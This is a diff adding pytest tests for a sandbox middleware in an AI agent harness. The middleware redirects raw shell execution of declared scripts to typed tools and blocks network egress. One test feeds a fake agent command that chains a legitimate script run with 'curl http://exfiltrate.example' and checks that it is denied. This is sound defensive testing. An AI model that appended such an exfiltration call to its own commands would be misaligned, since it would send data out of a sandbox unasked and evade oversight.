@@ -19,10 +19,12 @@ Mirrors ``test_registry.py`` (the sibling tool-surface test) for conventions.
 
 from __future__ import annotations
 
+import asyncio
 from pathlib import Path
 from typing import Any
 
 import pytest
+from langchain_core.messages import ToolMessage
 from langchain_core.tools import StructuredTool
 from pydantic import BaseModel
 
@@ -234,6 +236,129 @@ def test_redirects_one_per_spec_and_order_preserved():
     ]
     # the second spec (no subcommand) still matches its own script.
     assert redirs[1][0].search("python3 ranker.py --top 10") is not None
+
+
+# --- exec-guard: RoutingMiddleware redirects declared-script exec ----------
+# End-to-end proof of the invariant: a script exposed as a typed tool must be
+# reached via that tool, NOT via raw ``execute``. ``RoutingMiddleware`` fed the
+# declared redirect map returns a redirect ``ToolMessage`` WITHOUT awaiting the
+# handler (the command never runs). Mirrors the ``test_audit.py`` request/
+# handler pattern.
+
+def _routing_mw(specs):
+    """A RoutingMiddleware armed with the redirect map for ``specs``."""
+    from pux_harness.context.sandbox_routing import RoutingMiddleware
+    return RoutingMiddleware(declared_redirects=build_script_redirects(specs))
+
+
+def _exec_req(command: str):
+    """A fake execute/bash tool-call request carrying ``command`` + a thread_id."""
+    from types import SimpleNamespace
+    return SimpleNamespace(
+        tool_call={"name": "execute", "id": "c1", "args": {"command": command}},
+        state={"configurable": {"thread_id": "t1"}},
+    )
+
+
+def _recording_handler(ran: list):
+    """Async handler that records the call + returns a 'RAN' ToolMessage."""
+    async def _h(_req):
+        ran.append(True)
+        return ToolMessage(content="RAN", name="execute", tool_call_id="c1")
+    return _h
+
+
+def test_routing_redirects_declared_script_exec_without_running_it():
+    """The exec-guard: an ``execute("python3 signals.py score …")`` targeting a
+    declared script is REDIRECTED — returns a ToolMessage naming the typed tool
+    and the handler is NEVER awaited (the command does not run)."""
+    mw = _routing_mw([_spec(name="scan_signals", subcommand="score")])
+    ran: list = []
+    out = asyncio.run(mw.awrap_tool_call(
+        _exec_req("python3 signals.py score --ticker AAPL"),
+        handler=_recording_handler(ran)))
+    assert ran == [], "declared-script exec must NOT run the command"
+    assert isinstance(out, ToolMessage)
+    assert out.name == "execute"
+    target = PUX_PREFIX + "scan_signals"
+    assert target in out.content, out.content
+    assert out.tool_call_id == "c1"
+
+
+def test_routing_allows_non_declared_script_exec():
+    """A script NOT exposed as a typed tool stays exec-able — the guard is
+    surgical, not a blanket ``execute`` block. Handler IS awaited."""
+    mw = _routing_mw([_spec(name="scan_signals", subcommand="score")])
+    ran: list = []
+    out = asyncio.run(mw.awrap_tool_call(
+        _exec_req("python3 portfolio.py rebalance"),
+        handler=_recording_handler(ran)))
+    assert ran == [True], "non-declared script exec must run normally"
+    assert out.content == "RAN"
+
+
+def test_routing_allows_unexposed_subcommand_of_declared_script():
+    """Per-(script, subcommand) scoping at the MIDDLEWARE level:
+    ``signals.py rank`` is NOT exposed by ``scan_signals`` (wraps only
+    ``score``), so it runs — the agent has no typed alternative for it."""
+    mw = _routing_mw([_spec(name="scan_signals", subcommand="score")])
+    ran: list = []
+    asyncio.run(mw.awrap_tool_call(
+        _exec_req("cd /sandbox/workspace/orgs/x/sandbox && python3 signals.py rank"),
+        handler=_recording_handler(ran)))
+    assert ran == [True], "an un-exposed subcommand must stay exec-able"
+
+
+def test_routing_redirect_real_command_shapes():
+    """The redirect fires on the shapes the model actually emits: a
+    ``cd <dir> && python3 …`` prefix and an absolute path before the basename."""
+    mw = _routing_mw([_spec(name="scan_signals", subcommand="score")])
+    for cmd in (
+        "cd /sandbox/workspace/orgs/specialists/invest/sandbox && "
+        "python3 signals.py score --ticker AAPL",
+        "python3 orgs/specialists/invest/sandbox/signals.py score",
+    ):
+        ran: list = []
+        out = asyncio.run(mw.awrap_tool_call(_exec_req(cmd), handler=_recording_handler(ran)))
+        assert ran == [], f"should redirect (not run): {cmd!r}"
+        assert PUX_PREFIX + "scan_signals" in out.content
+
+
+def test_routing_deny_still_wins_over_redirect_for_network():
+    """Network egress deny takes precedence: a command with ``curl`` is denied
+    (the ``_DENY_MSG``), not redirected, even if it also names a declared
+    script. Both block the command; deny is the conservative choice."""
+    from pux_harness.context.sandbox_routing import _DENY_MSG
+    mw = _routing_mw([_spec(name="scan_signals", subcommand="score")])
+    out = asyncio.run(mw.awrap_tool_call(
+        _exec_req("python3 signals.py score && curl http://exfiltrate.example"),
+        handler=_recording_handler([])))
+    assert out.content == _DENY_MSG
+
+
+def test_routing_sync_wrap_mirrors_async_redirect():
+    """The sync ``wrap_tool_call`` (used by synchronous runners) redirects the
+    same as the async path — no async-only gap."""
+    mw = _routing_mw([_spec(name="scan_signals", subcommand="score")])
+    ran: list = []
+    out = mw.wrap_tool_call(
+        _exec_req("python3 signals.py score"),
+        handler=lambda _r: _recording_handler(ran)(_r))  # sync caller; redirect never awaits
+    assert ran == [], "sync path must also not run a redirected command"
+    assert PUX_PREFIX + "scan_signals" in out.content
+
+
+def test_routing_no_redirects_is_byte_identical_to_before():
+    """Default ``declared_redirects=[]`` (an org that declares nothing) leaves
+    routing byte-identical: a normal script exec is allowed (handler awaited)."""
+    from pux_harness.context.sandbox_routing import RoutingMiddleware
+    mw = RoutingMiddleware()  # no declared_redirects
+    assert mw.declared_redirects == []
+    ran: list = []
+    asyncio.run(mw.awrap_tool_call(
+        _exec_req("python3 anything.py go"),
+        handler=_recording_handler(ran)))
+    assert ran == [True]
 
 
 # --- command serialization (the crux) --------------------------------------
